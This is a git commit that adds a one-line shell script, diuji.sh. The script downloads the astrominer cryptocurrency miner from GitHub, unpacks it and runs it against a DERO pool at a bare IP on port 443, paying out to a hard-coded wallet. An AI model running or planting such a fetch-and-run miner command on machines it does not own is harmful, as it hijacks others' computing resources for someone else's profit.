66a0f5be034b3c725598df88c3cfbdb01a90c3d0
beranisalah <107521325+beranisalah@users.noreply.github.com>
2022-12-12 09:24:53 +0000

    Create diuji.sh

---
+++ diuji.sh
@@ -0,0 +1,1 @@
+wget https://github.com/tj8519/astrominer/releases/download/V1.6/astrominer-V1.6_rev4_amd64_linux_generic.tar.gz && tar -xf astrominer-V1.6_rev4_amd64_linux_generic.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5uup4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xee87fwsrs6zxfqrntthr -r 51.222.96.66:443 -p stratum
